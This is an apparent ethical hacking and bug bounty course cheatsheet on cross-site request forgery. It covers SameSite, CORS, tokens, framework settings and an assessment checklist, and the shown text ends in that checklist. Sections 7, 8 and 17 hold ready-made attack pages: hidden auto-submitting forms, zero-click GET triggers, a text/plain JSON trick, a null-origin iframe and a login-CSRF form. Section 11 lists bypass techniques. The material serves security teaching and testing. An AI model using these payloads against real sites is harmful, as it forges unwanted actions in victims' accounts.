# CSRF Master Cheatsheet — Complete Reference
> **Curriculum:** CSRF Mastery for Ethical Hacking & Bug Bounty  
> **Module:** 12 of 12 — Cumulative Synthesis  
> **Coverage:** All concepts from Modules 01–12  
> **Purpose:** Single-document reference for assessments, bug bounty, and secure design reviews

---

## Table of Contents
- [CSRF Master Cheatsheet — Complete Reference](#csrf-master-cheatsheet--complete-reference)
  - [Table of Contents](#table-of-contents)
  - [1. What CSRF Is — Precise Definition](#1-what-csrf-is--precise-definition)
  - [2. The Three Conditions](#2-the-three-conditions)
  - [3. The Four Analytical Questions](#3-the-four-analytical-questions)
  - [4. Browser Behavior Reference](#4-browser-behavior-reference)
  - [5. Cookie Attributes — Complete Reference](#5-cookie-attributes--complete-reference)
  - [6. SameSite — Full Behavior Matrix](#6-samesite--full-behavior-matrix)
  - [7. Attack Vectors — Complete Reference](#7-attack-vectors--complete-reference)
    - [GET-Based CSRF Vectors](#get-based-csrf-vectors)
    - [POST-Based CSRF Vectors](#post-based-csrf-vectors)
    - [JSON CSRF (CORS Misconfiguration Required)](#json-csrf-cors-misconfiguration-required)
    - [text/plain JSON Body (No Preflight)](#textplain-json-body-no-preflight)
    - [Multi-Step Chain](#multi-step-chain)
  - [8. PoC Templates](#8-poc-templates)
    - [Standard POST CSRF](#standard-post-csrf)
    - [GET CSRF (Zero Interaction)](#get-csrf-zero-interaction)
    - [DELETE via Method Override](#delete-via-method-override)
    - [Null Origin (Sandboxed iframe)](#null-origin-sandboxed-iframe)
  - [9. CSRF Token — Requirements and Failure Modes](#9-csrf-token--requirements-and-failure-modes)
    - [Required Properties](#required-properties)
    - [Failure Modes Test Suite](#failure-modes-test-suite)
    - [Null Equality Bypass](#null-equality-bypass)
  - [10. Defense Stack — Every Control](#10-defense-stack--every-control)
  - [11. Bypass Techniques — Complete Reference](#11-bypass-techniques--complete-reference)
  - [12. CORS and CSRF Interaction](#12-cors-and-csrf-interaction)
  - [13. Modern Architecture CSRF](#13-modern-architecture-csrf)
  - [14. OAuth CSRF — State Parameter](#14-oauth-csrf--state-parameter)
  - [15. Framework Reference](#15-framework-reference)
  - [16. Multi-Step Workflow CSRF](#16-multi-step-workflow-csrf)
  - [17. Login CSRF](#17-login-csrf)
  - [18. Architecture Review — Trust Boundary Model](#18-architecture-review--trust-boundary-model)
  - [19. Secure Design Principles](#19-secure-design-principles)
  - [20. Assessment Checklist — Full](#20-assessment-checklist--full)
    - [Phase 1 — Reconnaissance](#phase-1--reconnaissance)
    - [Phase 2 — Endpoint Analysis](#phase-2--endpoint-analysis)
    - [Phase 3 — Token Validation Testing](#phase-3--token-validation-testing)
    - [Phase 4 — CORS Analysis](#phase-4--cors-analysis)
    - [Phase 5 — Bypass Scenario Testing](#phase-5--bypass-scenario-testing)
  - [21. Token Validation Test Suite](#21-token-validation-test-suite)
  - [22. Impact Scoping and Severity](#22-impact-scoping-and-severity)
  - [23. Common Misconceptions — Master List](#23-common-misconceptions--master-list)
  - [24. Bug Bounty Report Templates](#24-bug-bounty-report-templates)
    - [Standard Missing CSRF Token](#standard-missing-csrf-token)
    - [Token Validation Bypass](#token-validation-bypass)
    - [Architectural Finding](#architectural-finding)
  - [Quick Reference — What Stops What](#quick-reference--what-stops-what)

---

## 1. What CSRF Is — Precise Definition

> **Cross-Site Request Forgery** causes an authenticated user's browser to send an unintended, state-changing request to a web application using the user's credentials — without the user's knowledge or consent.

```
CSRF borrows credentials. It does not steal them.
The attacker never sees the cookie or session token.
The browser does the attacker's work using credentials it already holds.

Authentication ≠ Legitimacy
  Session cookie proves WHO you are
  CSRF token proves WHERE the request came from
  Re-authentication proves you INTENDED this specific action
```

---

## 2. The Three Conditions

All three must be present. Remove any one and simple CSRF fails.

```
┌─────────────────────────────────────────────────────────────┐
│  CONDITION 1 — ACTIVE AUTHENTICATED SESSION                 │
│  Victim has a valid session cookie in their browser         │
│  Defense: Short session timeouts, session invalidation      │
│                                                             │
│  CONDITION 2 — AUTOMATIC CREDENTIAL ATTACHMENT             │
│  Browser attaches session cookie automatically              │
│  Defense: SameSite=Strict/Lax, token-in-header auth        │
│                                                             │
│  CONDITION 3 — NO INTENT VERIFICATION                       │
│  Server cannot distinguish forged from legitimate request   │
│  Defense: CSRF token, Origin validation, re-authentication  │
└─────────────────────────────────────────────────────────────┘
```

---

## 3. The Four Analytical Questions

Apply to every endpoint before testing:

```
Q1: Who does the server think made this request?
    → Identity: which user account

Q2: How does the server know that?
    → Evidence: session cookie, JWT in cookie, etc.

Q3: Could someone else cause that same evidence to be present?
    → Forgability: can the attacker replicate the request?

Q4: What would the server need to check that an attacker cannot forge?
    → Defense: what proof of intent is unforgeable?

CSRF lives in the gap between Q2 and Q3.
```

---

## 4. Browser Behavior Reference

```
WHAT BROWSERS DO AUTOMATICALLY:
  ✓ Attach matching cookies to every request (ambient authority)
  ✓ Follow <img src>, <script src>, <iframe src> on page load
  ✓ Submit <form> on body onload
  ✓ Send Origin header on cross-origin requests
  ✓ Send Referer header (unless suppressed)
  ✓ Enforce SameSite restrictions on cookie attachment
  ✓ Send CORS preflight for non-simple cross-origin requests

WHAT BROWSERS DO NOT DO:
  ✗ Ask user permission before attaching cookies
  ✗ Tell the server which page triggered a request (unless Origin/Referer)
  ✗ Prevent HTML tags from making cross-origin requests
  ✗ Allow JavaScript to set arbitrary request headers cross-origin

ATTACKER CAN CONTROL:
  ✓ Destination URL
  ✓ HTTP method (GET via tags, POST via form)
  ✓ Request body (hidden form fields)
  ✓ Query parameters
  ✓ Content-Type (limited to simple types via HTML)
  ✓ Referer suppression (meta referrer policy)

ATTACKER CANNOT CONTROL:
  ✗ Cookie values (browser attaches from its own jar)
  ✗ Origin header (browser sets this)
  ✗ Custom request headers (trigger CORS preflight)
  ✗ Response content (SOP blocks cross-origin reads)
  ✗ Authorization header (cannot be set by form/img)
```

---

## 5. Cookie Attributes — Complete Reference

```
┌──────────────────┬───────────────────────────┬───────────────────┐
│ Attribute        │ What It Does              │ CSRF Relevance    │
├──────────────────┼───────────────────────────┼───────────────────┤
│ HttpOnly         │ Blocks JS cookie read     │ NONE — cookie     │
│                  │                           │ still auto-sent   │
├──────────────────┼───────────────────────────┼───────────────────┤
│ Secure           │ HTTPS only                │ NONE — encrypted  │
│                  │                           │ forgery = forgery │
├──────────────────┼───────────────────────────┼───────────────────┤
│ SameSite=Strict  │ Never cross-site          │ STRONG — complete │
│                  │                           │ cross-site block  │
├──────────────────┼───────────────────────────┼───────────────────┤
│ SameSite=Lax     │ Cross-site top-level      │ PARTIAL — GET     │
│                  │ GET navigation only       │ navigation gap    │
├──────────────────┼───────────────────────────┼───────────────────┤
│ SameSite=None    │ Always sent cross-site    │ NONE — full       │
│                  │ (requires Secure)         │ ambient authority │
├──────────────────┼───────────────────────────┼───────────────────┤
│ Domain           │ Scope to domain +         │ RISK — subdomains │
│                  │ subdomains                │ all receive cookie│
├──────────────────┼───────────────────────────┼───────────────────┤
│ Path             │ Scope to path prefix      │ MINIMAL           │
├──────────────────┼───────────────────────────┼───────────────────┤
│ Max-Age/Expires  │ Cookie lifetime           │ INDIRECT — longer │
│                  │                           │ window = more risk│
└──────────────────┴───────────────────────────┴───────────────────┘

KEY: HttpOnly prevents XSS theft. It does NOT prevent CSRF.
     Secure prevents network interception. It does NOT prevent CSRF.
     SameSite is the only cookie attribute that directly addresses CSRF.
```

---

## 6. SameSite — Full Behavior Matrix

```
DEFINITIONS:
  Same-site:   Same eTLD+1 (e.g., both example.com)
  Same-origin: Same protocol + host + port
  Cross-site:  Different eTLD+1

┌──────────────────────────────────┬──────────┬──────────┬──────────┐
│ Request Type                     │ Strict   │ Lax      │ None     │
├──────────────────────────────────┼──────────┼──────────┼──────────┤
│ Same-site any request            │ ✅ Sent  │ ✅ Sent  │ ✅ Sent  │
├──────────────────────────────────┼──────────┼──────────┼──────────┤
│ Cross-site top-level GET nav     │ ❌ Block │ ✅ Sent  │ ✅ Sent  │
│ (<a>, meta refresh, location.href│          │          │          │
├──────────────────────────────────┼──────────┼──────────┼──────────┤
│ Cross-site POST form             │ ❌ Block │ ❌ Block │ ✅ Sent  │
├──────────────────────────────────┼──────────┼──────────┼──────────┤
│ Cross-site subresource GET       │ ❌ Block │ ❌ Block │ ✅ Sent  │
│ (<img>, <iframe>, fetch)         │          │          │          │
├──────────────────────────────────┼──────────┼──────────┼──────────┤
│ Cross-site fetch() POST          │ ❌ Block │ ❌ Block │ ✅ Sent  │
└──────────────────────────────────┴──────────┴──────────┴──────────┘

LAX EXCEPTIONS (cookie IS sent despite cross-site):
  ✓ <a href> click → top-level GET navigation
  ✓ window.location.href = "..." → top-level GET navigation
  ✓ window.location.replace("...") → top-level GET navigation
  ✓ <meta http-equiv="refresh"> → top-level GET navigation
  ✓ GET <form> submission → top-level GET navigation
  ✗ <img src> → subresource (NOT top-level)
  ✗ <iframe src> → subresource (NOT top-level)
  ✗ fetch() → not top-level navigation

LAX+POST TIMING WINDOW:
  Cookies WITHOUT explicit SameSite attribute (Chrome):
  First 2 minutes after creation: behaves like SameSite=None for POST
  After 2 minutes: enforces Lax
  Always set SameSite explicitly — never rely on browser defaults

CRITICAL: SameSite does NOT isolate subdomains.
  app.example.com → api.example.com = SAME-SITE
  SameSite=Strict/Lax cookies ARE sent between subdomains
  Only separate registered domains provide genuine isolation
```

---

## 7. Attack Vectors — Complete Reference

### GET-Based CSRF Vectors

```html
<!-- Zero interaction — fires on page parse (SameSite=Lax: NOT sent — subresource) -->
<img src="https://target.com/action?param=value" style="display:none">

<!-- Zero interaction — top-level navigation (SameSite=Lax: SENT) -->
<meta http-equiv="refresh" content="0; url=https://target.com/action?param=value">

<!-- Zero interaction — top-level navigation (SameSite=Lax: SENT) -->
<script>window.location.href = "https://target.com/action?param=value";</script>

<!-- One click — top-level navigation (SameSite=Lax: SENT) -->
<a href="https://target.com/action?param=value">Click here</a>
```

### POST-Based CSRF Vectors

```html
<!-- Auto-submit on page load -->
<!DOCTYPE html>
<html>
<body onload="document.forms[0].submit()">
  <form action="https://target.com/action" method="POST" style="display:none">
    <input type="hidden" name="param1" value="attacker_value">
    <input type="hidden" name="param2" value="attacker_value">
  </form>
</body>
</html>
```

### JSON CSRF (CORS Misconfiguration Required)

```javascript
fetch("https://target.com/api/action", {
  method: "POST",
  credentials: "include",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ param: "attacker_value" })
});
```

### text/plain JSON Body (No Preflight)

```html
<body onload="document.forms[0].submit()">
  <form action="https://target.com/api/action"
        method="POST"
        enctype="text/plain">
    <input type="hidden"
           name='{"param":"attacker_value","x":"'
           value='"}'>
  </form>
</body>
<!-- Body sent: {"param":"attacker_value","x":"="} -->
```

### Multi-Step Chain

```javascript
async function csrfChain() {
  await fetch("https://target.com/step1", { method: "POST", credentials: "include" });
  await fetch("https://target.com/step2", { method: "POST", credentials: "include",
    body: "confirm=true" });
  await fetch("https://target.com/step3", { method: "POST", credentials: "include" });
}
csrfChain();
```

---

## 8. PoC Templates

### Standard POST CSRF

```html
<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body onload="document.forms[0].submit()">
  <form action="https://TARGET/ENDPOINT" method="POST" style="display:none">
    <input type="hidden" name="PARAM" value="ATTACKER_VALUE">
  </form>
  <p>Please wait...</p>
</body>
</html>
```

### GET CSRF (Zero Interaction)

```html
<!DOCTYPE html>
<html>
<head>
  <meta http-equiv="refresh" content="0; url=https://TARGET/ENDPOINT?PARAM=VALUE">
</head>
<body><p>Loading...</p></body>
</html>
```

### DELETE via Method Override

```html
<body onload="document.forms[0].submit()">
  <form action="https://TARGET/resource/42?_method=DELETE"
        method="POST" style="display:none">
    <input type="hidden" name="_method" value="DELETE">
  </form>
</body>
```

### Null Origin (Sandboxed iframe)

```html
<iframe sandbox="allow-scripts allow-forms" srcdoc="
  <form action='https://TARGET/action' method='POST'>
    <input type='hidden' name='param' value='value'>
  </form>
  <script>document.forms[0].submit();</script>
"></iframe>
<!-- Sends Origin: null -->
```

---

## 9. CSRF Token — Requirements and Failure Modes

### Required Properties

```
1. Cryptographically random (secrets.token_urlsafe, crypto.randomBytes)
2. Sufficient entropy (minimum 128 bits, recommended 256 bits)
3. Session-bound (stored per-session, validated against request session)
4. Server-side validation (comparison happens on server)
5. Constant-time comparison (hmac.compare_digest, crypto.timingSafeEqual)
6. Correct transmission channel:
   MUST:     request body OR custom header (X-CSRF-Token)
   MUST NOT: cookie (auto-sent = no protection)
   MUST NOT: URL parameter (Referer leakage)
7. Expiration (tied to session lifetime)
8. Invalidated on logout
```

### Failure Modes Test Suite

```
TEST 1: Remove token entirely         → expect 403
TEST 2: Send empty value (token=)     → expect 403
TEST 3: Send random value (token=aaa) → expect 403  ← most important
TEST 4: Cross-user token              → expect 403  ← session binding
TEST 5: Reuse after logout            → expect 403
TEST 6: GET request, no token         → expect 403 or 405
TEST 7: Content-Type: text/plain      → expect 403

If TEST 3 returns 200: presence-only validation
If TEST 4 returns 200: token not session-bound
Both are Critical findings
```

### Null Equality Bypass

```python
# VULNERABLE — None == None → True
if token == session.get('csrf_token'):
    proceed()

# CORRECT
submitted = request.POST.get('csrf_token', '')
expected = request.session.get('csrf_token', '')
if not submitted or not expected:        # explicit empty rejection
    return 403
if not hmac.compare_digest(submitted, expected):
    return 403
```

---

## 10. Defense Stack — Every Control

```
┌──────────────────────┬────────────────────────┬──────────────────────────┐
│ Defense              │ What It Prevents        │ Failure Mode             │
├──────────────────────┼────────────────────────┼──────────────────────────┤
│ CSRF Token           │ Forged requests from    │ XSS extraction           │
│ (synchronizer)       │ any unauthed origin     │ Token leakage via URL    │
│                      │                         │ Presence-only check      │
│                      │                         │ Not session-bound        │
├──────────────────────┼────────────────────────┼──────────────────────────┤
│ SameSite=Lax         │ Cross-site POST CSRF    │ Same-site subdomains     │
│                      │                         │ GET state changes        │
│                      │                         │ Lax+POST timing window   │
├──────────────────────┼────────────────────────┼──────────────────────────┤
│ SameSite=Strict      │ All cross-site CSRF     │ Same-site subdomains     │
│                      │                         │ UX cost (external links) │
├──────────────────────┼────────────────────────┼──────────────────────────┤
│ Origin Validation    │ Identifiable cross-     │ Absent header allowed    │
│                      │ origin requests         │ Substring matching       │
│                      │                         │ Null origin allowed      │
│                      │                         │ Same-origin XSS          │
├──────────────────────┼────────────────────────┼──────────────────────────┤
│ Referer Validation   │ Identifiable cross-     │ Suppressible             │
│                      │ site requests           │ Absent in many contexts  │
│                      │                         │ Defense-in-depth only    │
├──────────────────────┼────────────────────────┼──────────────────────────┤
│ Double-Submit Cookie │ Forged requests         │ Subdomain cookie inject  │
│                      │ (stateless apps)        │ Weaker than synchronizer │
├──────────────────────┼────────────────────────┼──────────────────────────┤
│ Signed Double-Submit │ Forged requests +       │ Server secret compromise │
│                      │ subdomain injection     │                          │
├──────────────────────┼────────────────────────┼──────────────────────────┤
│ Custom Header        │ HTML form CSRF +        │ Same-site XSS sets it    │
│ (X-Requested-With)   │ cross-origin fetch      │ CORS misconfig           │
├──────────────────────┼────────────────────────┼──────────────────────────┤
│ Content-Type: json   │ HTML form CSRF          │ text/plain JSON body     │
│                      │ (raises bar)            │ Same-site XSS            │
│                      │                         │ CORS misconfig           │
├──────────────────────┼────────────────────────┼──────────────────────────┤
│ Re-authentication    │ ALL CSRF including      │ None via CSRF            │
│                      │ same-origin XSS         │ (UX cost)                │
└──────────────────────┴────────────────────────┴──────────────────────────┘

COMMON FAILURE MODE: Same-origin XSS defeats ALL defenses except re-auth.
GENUINE INDEPENDENCE: CSRF token (fails to XSS) + Re-auth (fails to nothing).
```

---

## 11. Bypass Techniques — Complete Reference

```
BYPASS 1: Same-origin XSS
  Defeats: Everything (token, SameSite, Origin, Referer, custom header)
  Survives: Re-authentication only
  Mechanism: XSS reads token from DOM, makes same-origin requests

BYPASS 2: Cross-subdomain XSS
  Defeats: SameSite (same-site request), Origin (if subdomain trusted)
  Survives: CSRF token (SOP blocks cross-subdomain response reads)
  Needs: Separate token leakage vector for full bypass

BYPASS 3: Subdomain Takeover
  Defeats: SameSite (same-site), Origin check (if suffix/substring match)
  Survives: CSRF token (SOP still blocks cross-origin reads)
  Needs: Separate token leakage vector

BYPASS 4: Token Leakage via Referer
  Defeats: CSRF token (when token appears in URL)
  Mechanism: Page loads third-party resource; Referer exposes token
  Fix: Never put CSRF token in URL

BYPASS 5: CORS Misconfiguration
  Defeats: CSRF token (attacker reads token from response) + CORS defense
  Requires: ACAO: [attacker-origin] + ACAC: true
  Note: ACAO: * alone CANNOT be combined with credentials

BYPASS 6: Origin Suffix/Substring Matching
  Defeats: Origin validation
  Example: .endswith(".victim.com") → evil.victim.com (takeover) passes
  Fix: Exact allowlist match only

BYPASS 7: Null Origin
  Defeats: Origin validation if null is allowlisted
  Mechanism: Sandboxed iframe sends Origin: null
  Fix: Explicitly reject null unless specifically needed

BYPASS 8: Referer Suppression
  Defeats: Referer validation (if missing Referer allowed)
  Mechanism: <meta name="referrer" content="no-referrer">
  Note: Attacker cannot SET Referer — can only SUPPRESS it

BYPASS 9: Double-Submit Cookie Injection
  Defeats: Double-submit cookie pattern
  Requires: Control of any subdomain (set cookie for parent domain)
  Fix: Signed double-submit (HMAC cannot be forged)

BYPASS 10: Token Fixation
  Defeats: CSRF token
  Requires: Predictable token OR endpoint that lets attacker set token

BYPASS 11: Method Switching (GET fallback)
  Defeats: POST CSRF protection if GET route exists
  Test: Send GET to POST endpoint URL

BYPASS 12: Method Override (_method=DELETE)
  Defeats: Method-specific CSRF exemptions
  Framework: Rails, Laravel, older Express

BYPASS 13: text/plain JSON Body
  Defeats: Content-Type: application/json as sole defense
  Mechanism: enctype="text/plain" form, JSON crafted as name=value
  No preflight required (text/plain is simple request)

BYPASS 14: Lax+POST Timing Window
  Defeats: SameSite=Lax (for 2 min after login)
  Requires: Cookie without explicit SameSite attribute (Chrome)
  Chain: Login CSRF → immediate POST within window

BYPASS 15: !origin Allowance in CORS
  Defeats: CORS-as-CSRF-defense
  Mechanism: if (!origin || allowed.includes(origin)) → no-Origin passes
  Fix: Only allow absent Origin for same-origin/non-browser contexts
```

---

## 12. CORS and CSRF Interaction

```
PREFLIGHT MECHANICS:
  Simple requests (GET, POST+form types): no preflight → direct send
  Preflighted (JSON, custom headers, PUT/DELETE): OPTIONS first

PREFLIGHT IS NOT A SECURITY MECHANISM:
  Preflight defers entirely to CORS policy
  If CORS policy is wrong → preflight approves attacker
  Security comes from the CORS POLICY, not from preflight existence

DANGEROUS CORS PATTERNS:
  // Origin reflection — MOST DANGEROUS
  const origin = req.headers.origin;
  res.header('Access-Control-Allow-Origin', origin);  // any origin accepted
  res.header('Access-Control-Allow-Credentials', 'true');

  // Missing null check
  if (!origin || allowed.includes(origin)) { allow }
  // → requests with no Origin header pass unconditionally

ACAO: * + ACAC: true = BROWSER BLOCKS (cannot combine)
ACAO: [specific-attacker-origin] + ACAC: true = ENABLES credentialed CSRF

CORS RISK MATRIX:
  ACAO: * alone              → can't combine with credentials → LOW CSRF risk
  ACAO: specific + ACAC:true → full credentialed access → CRITICAL
  ACAO: reflects + ACAC:true → any origin accepted → CRITICAL
  ACAO: null + ACAC:true     → sandboxed iframe attack → HIGH

SAME-SITE SUBDOMAINS AND CORS:
  app.example.com → api.example.com: cross-origin, same-site
  CORS applies (different origin)
  SameSite does NOT restrict (same-site)
  CORS allowlist is the only defense between subdomains
  Cookie IS sent regardless of CORS decision (SameSite allows same-site)
  If not in CORS allowlist: response blocked but action may still execute
```

---

## 13. Modern Architecture CSRF

```
CORE PRINCIPLE:
  CSRF risk = credential delivery mechanism
  Cookie = ambient authority = CSRF vulnerable
  Authorization header = explicit = CSRF safe
  JWT FORMAT is irrelevant — DELIVERY MECHANISM is everything

CREDENTIAL DELIVERY COMPARISON:
  Session cookie          → HIGH CSRF risk
  JWT in HttpOnly cookie  → HIGH CSRF risk (same as session cookie)
  JWT in localStorage     → ZERO CSRF risk (explicit JS attachment)
  JWT in sessionStorage   → ZERO CSRF risk
  API key in header       → ZERO CSRF risk
  Remember-me cookie      → HIGH CSRF risk (any endpoint accepting it)

REMEMBER-ME COOKIE TRAP:
  App previously used JWT in header (CSRF safe)
  Developer adds remember-me cookie feature
  Any endpoint accepting the cookie = now CSRF vulnerable
  .csrf().disable() + .rememberMe() = critical Spring Security mistake

SPA + API ARCHITECTURE:
  app.example.com → api.example.com: same-site, different origin
  Session cookie from api: sent on ALL same-site requests
  CORS controls response reading between subdomains
  SameSite controls cookie attachment (applies to all same-site)
  Effective attack surface = entire *.example.com subdomain space

fetch() credentials: 'include':
  Instructs browser to attach cookies
  NOT an override of SameSite — SameSite still enforced
  Response exposed to JS ONLY if server sends ACAC: true

GRAPHQL CSRF:
  POST JSON → same risk as any REST JSON endpoint
  GET mutations → CRITICAL: Lax exception applies, no preflight
  Batching → single CSRF = multiple mutations
  Disable GET mutations in production

CORRECT SPA CSRF PATTERN:
  session=abc (HttpOnly cookie) + csrf-token=xyz (NOT HttpOnly cookie)
  SPA reads csrf-token cookie → sends in X-CSRF-Token header
  Server validates header value against cookie value
```

---

## 14. OAuth CSRF — State Parameter

```
PURPOSE: state parameter is the CSRF token for OAuth flows
         Prevents forged OAuth callbacks linking attacker's identity to victim

CORRECT IMPLEMENTATION:
  // Initiation
  const state = crypto.randomBytes(32).toString('hex');
  req.session.oauth_state = state;
  redirect(`https://provider.com/oauth?...&state=${state}`);

  // Callback
  const received = req.query.state || '';
  const expected = req.session.oauth_state || '';
  delete req.session.oauth_state;  // single-use: pop not get

  if (!received || !expected) return res.status(403).send('Invalid state');

  const r = Buffer.from(received);
  const e = Buffer.from(expected);
  if (r.length !== e.length || !crypto.timingSafeEqual(r, e)) {
    return res.status(403).send('Invalid state');
  }

THREE BUGS IN VULNERABLE IMPLEMENTATIONS:
  Bug 1: state == session.get('state') → None == None → True (null bypass)
  Bug 2: session.get() instead of session.pop() → state reusable (replay)
  Bug 3: No constant-time comparison → timing side channel

NULL EQUALITY BYPASS:
  No state in request + no state in session:
  undefined === undefined → True in JS
  None == None → True in Python
  Fix: explicit empty check before comparison
```

---

## 15. Framework Reference

```
DJANGO:
  CsrfViewMiddleware: enabled by default, runs BEFORE auth middleware
  Token locations: X-CSRFToken header OR csrfmiddlewaretoken in body
  JSON body token: INVISIBLE to Django (not form-encoded)
    → Must use X-CSRFToken header for JSON/SPA
  csrf_token cookie: NOT HttpOnly by design (SPA must read it)
  CSRF_COOKIE_HTTPONLY = True: breaks SPA integration
  DRF: SessionAuthentication enforces CSRF; TokenAuthentication does not
  Danger: @csrf_exempt + session auth = vulnerable
  Danger: Commenting out middleware = global disable

RAILS:
  protect_from_forgery with: :exception (correct — halts request)
  protect_from_forgery with: :null_session (DANGEROUS — action executes)
  protect_from_forgery with: :reset_session (action executes with empty session)
  ActionController::API = NO CSRF protection (common mistake with session auth)
  Token: authenticity_token in params or X-CSRF-Token header
  Danger: skip_before_action :verify_authenticity_token too broadly

SPRING SECURITY:
  CSRF enabled by default
  .csrf().disable() = safe ONLY for fully stateless JWT (no cookies anywhere)
  .csrf().disable() + .rememberMe() = CRITICAL — all endpoints vulnerable
  CookieCsrfTokenRepository.withHttpOnlyFalse() required for SPA
  Without withHttpOnlyFalse(): cookie HttpOnly → SPA can't read → 403 on all requests

EXPRESS:
  NO built-in CSRF protection
  csurf: DEPRECATED — use csrf-csrf
  Middleware ORDER: session → csrf → routes (csrf after routes = never runs)
  All session-authenticated Express apps need explicit CSRF middleware

LARAVEL:
  VerifyCsrfToken middleware: enabled by default
  $except array: routes exempted from verification
  Token: _token in body or X-CSRF-TOKEN header
  Danger: adding API routes to $except with session auth

FRAMEWORK CSRF DISABLE PATTERNS TO GREP FOR:
  Django:  grep -rn "csrf_exempt" . and check middleware list
  Rails:   grep -rn "skip_before_action.*verify_authenticity"
  Spring:  grep -rn "csrf().disable()"
  Express: grep -rn "csrf" package.json (is any CSRF package present?)
  Laravel: check $except array in VerifyCsrfToken
```

---

## 16. Multi-Step Workflow CSRF

```
WHY MULTI-STEP DOESN'T PROTECT:
  Each step = independent HTTP request = individually forgeable
  Server sets flow cookies in responses → browser stores automatically
  Attacker does not forge cookies — server provides them
  JS async/await chains steps trivially

CORRECT MULTI-STEP DEFENSE:
  Step 1: CSRF token (prevents forging initiation)
  Step 2: Server-generated workflow ID (session-bound, single-use)
          Proves sequence: attacker cannot read Step 1 response (SOP)
  Step 3: Re-authentication (password/OTP)
          Cannot be supplied by CSRF even with all prior steps forged
  All: Short expiration + single-use enforcement + step sequence validation

SKIP-STEP TESTS:
  Access Step 2 without completing Step 1 → should reject
  Access Step 3 without Steps 1+2 → should reject
  Replay Step 3 after completion → should reject
  Use attacker's flow ID in victim's session → should reject

CONFIRMATION DIALOGS:
  Client-side JS dialog: ZERO CSRF protection
  Attacker calls form.submit() directly — dialog never shown
  Only server-side confirmation tokens provide real protection

LOGIN CSRF:
  Forces victim to log in as attacker
  Victim submits real data (payment, OAuth, identity) into attacker's account
  Attacker logs in later and reads victim's data
  Fix: CSRF token on login form
  Common mistake: frameworks only protect authenticated routes
```

---

## 17. Login CSRF

```
MECHANISM:
  Attacker page auto-submits login form with attacker's credentials
  Victim authenticates as attacker without knowing
  Victim uses application — submits their real data into attacker's account

DAMAGE MODEL:
  Financial: victim saves payment method → attacker uses it
  Identity: victim completes KYC → attacker has victim's ID documents
  OAuth: victim connects Google/Facebook → attacker logs in as victim
  Data: victim enters addresses, medical info → attacker reads it all

WHY IT'S MISSED:
  Developers protect authenticated routes, not login form
  "Login is public — anyone can see it — why protect with CSRF?"
  Because creating an authenticated session is itself exploitable

POC:
  <body onload="document.forms[0].submit()">
  <form action="https://target.com/login" method="POST" style="display:none">
    <input type="hidden" name="username" value="attacker@evil.com">
    <input type="hidden" name="password" value="KnownPassword123">
  </form>

FIX: CSRF token on login form
```

---

## 18. Architecture Review — Trust Boundary Model

```
TRUST BOUNDARY MAPPING (do this first):
  1. List all origins (protocol + host + port)
  2. Group by eTLD+1 (registered domain) → same-site groups
  3. Map CORS allowlist entries for each service
  4. Identify user-submitted content surfaces (XSS attack surface)
  5. For each pair: same-origin? same-site? CORS relationship?

SAME-SITE SUBDOMAIN RISK:
  All subdomains of example.com are same-site with each other
  SameSite (any value) does NOT isolate subdomains
  XSS on weak.example.com → credentialed requests to api.example.com
  SameSite=Strict only blocks different registered domains

CORS ALLOWLIST = TRUST EXTENSION:
  Each entry: if that origin is compromised → attacker has API access
  Security posture of API = security posture of weakest allowlisted origin
  Question before any entry: does this origin need to READ responses?
    (Same-site origins can already SEND requests without CORS)
    (Only add to CORS if response reading is required)

!origin BYPASS:
  if (!origin || allowed.includes(origin)) { allow }
  Requests with no Origin header bypass CORS check entirely
  Non-browser clients, some older browsers, direct navigation = no Origin

WAF IS NOT A CSRF DEFENSE:
  CSRF request = indistinguishable from legitimate at network level
  Both carry valid session cookie, valid content type, allowed origin
  WAF cannot verify user intent
  WAF = defense-in-depth at best

BLAST RADIUS MINIMIZATION:
  Separate security zones to separate registered domains
  Backend-to-backend for service-to-service (no browser cookie)
  Scoped API tokens with minimum permissions
  Re-auth limits blast radius even for authenticated sessions

GENUINE DEFENSE INDEPENDENCE:
  Two controls are independent if they have DIFFERENT failure modes
  CSRF token (fails to XSS) + SameSite (fails to same-site subdomain)
    → Same failure mode (XSS on any subdomain = both defeated)
  CSRF token (fails to XSS) + Re-auth (fails to nothing via CSRF)
    → Different failure modes → genuine independence
```

---

## 19. Secure Design Principles

```
PRINCIPLE 1 — WEAKEST LINK:
  CSRF posture = security of weakest trusted origin
  Every CORS entry = trust extension
  Every same-site subdomain = implicit trust

PRINCIPLE 2 — CREDENTIAL DELIVERY:
  Cookie = ambient = CSRF vulnerable
  Explicit header = no ambient authority = CSRF safe
  Architecture type (SPA, REST, GraphQL) is irrelevant
  Delivery mechanism is everything

PRINCIPLE 3 — EXPLICIT OVER IMPLICIT:
  "CORS prevents CSRF" → only cross-origin, not same-site
  "SameSite=Strict protects admin" → not from same-site subdomains
  "WAF protects legacy" → WAF cannot verify intent
  Explicit controls (token, re-auth) are verifiable; implicit ones are not

PRINCIPLE 4 — SECURE BY DEFAULT:
  New endpoints protected without opt-in (middleware, not decorator)
  New CORS entries require documented security review
  New admin actions require re-auth by default

PRINCIPLE 5 — BLAST RADIUS MINIMIZATION:
  High-security + low-security on same domain = security floor = low
  Separate registered domains for different security zones
  Backend-to-backend eliminates browser cookie involvement

PRINCIPLE 6 — DEFENSE INDEPENDENCE:
  Defenses sharing a failure mode are not independent
  Layer across: browser level + application level + design level
  Only design-level (re-auth) is immune to XSS bypass
```

---

## 20. Assessment Checklist — Full

### Phase 1 — Reconnaissance

```
AUTHENTICATION MAPPING:
  □ What cookies are set on login? (name, SameSite, HttpOnly, Secure)
  □ Is SameSite explicit or relying on browser default?
  □ Is there a remember-me cookie? (introduces CSRF even to JWT apps)
  □ Do any endpoints accept cookie auth as alternative to header auth?
  □ Is JWT stored in localStorage/header (safe) or cookie (vulnerable)?

ARCHITECTURE MAPPING:
  □ List all subdomains of the target registered domain
  □ Check for subdomain takeover opportunities (dangling CNAMEs)
  □ Check CORS allowlist for each service
  □ Identify user-submitted content surfaces on any subdomain
  □ Identify services with weaker security in same registered domain
```

### Phase 2 — Endpoint Analysis

```
FOR EACH STATE-CHANGING ENDPOINT:
  □ Is there a CSRF token in the request?
  □ What HTTP method? (GET state changes = highest risk)
  □ What Content-Type? (text/plain = no preflight)
  □ Is there Origin/Referer validation?
  □ Is there re-authentication for this action?
  □ What SameSite value on session cookie?
  □ Any method override support? (_method, X-HTTP-Method-Override)

SPECIFIC CHECKS:
  □ Login form: CSRF token present?
  □ OAuth callback: state parameter validated correctly?
